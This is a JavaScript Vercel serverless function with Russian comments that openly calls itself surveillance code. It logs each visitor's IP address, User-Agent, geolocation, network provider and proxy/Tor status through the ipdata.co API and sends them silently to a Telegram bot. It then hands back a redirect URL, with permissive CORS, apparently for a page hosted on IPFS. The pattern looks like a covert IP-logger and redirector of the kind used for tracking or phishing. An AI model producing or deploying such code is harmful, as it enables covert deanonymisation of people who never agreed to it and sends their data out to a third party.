// Этот код исполняется на сервере Vercel, а не в браузере пользователя!

// Хелпер для флага страны
const getFlagEmoji = (countryCode) => {
    if (!countryCode || countryCode.length !== 2) return '🏳️';
    const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
    return String.fromCodePoint(...codePoints);
};

export default async function handler(req, res) {
    // --- Получаем все ключи из безопасных переменных окружения Vercel ---
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;
    const IPDATA_API_KEY = process.env.IPDATA_API_KEY;
    const REDIRECT_URL = process.env.REDIRECT_URL;

    // --- НАЧАЛО СЛЕЖКИ (происходит на сервере) ---
    try {
        // Получаем IP и User-Agent пользователя из заголовков запроса
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const userAgent = req.headers['user-agent'];

        // Запрашиваем детальную инфу по IP с ipdata.co
        const ipdataResponse = await fetch(`https://api.ipdata.co/${ip}?api-key=${IPDATA_API_KEY}`);
        const data = await ipdataResponse.json();
        
        const flag = data.emoji_flag || getFlagEmoji(data.country_code);

        const message = `
${flag} New Visit [Vercel]:
📌IP: ${data.ip}
🌎Location: ${data.country_name}, ${data.region}, ${data.city}
🧨Provider: ${data.asn.name}
💫Threat: Proxy: ${data.threat.is_proxy}, Tor: ${data.threat.is_tor}
🦊User-Agent: ${userAgent}
        `;
        
        // Отправляем лог в Telegram (асинхронно, не ждем ответа)
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
        fetch(telegramUrl);

    } catch (error) {
        // Если слежка не удалась, это не должно сломать редирект
        console.error("Tracking failed:", error);
    }
    // --- КОНЕЦ СЛЕЖКИ ---

    // --- ОТДАЕМ URL ДЛЯ РЕДИРЕКТА ---
    // Устанавливаем CORS, чтобы браузер не блокировал запрос с IPFS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.status(200).json({ redirectTo: REDIRECT_URL });
}


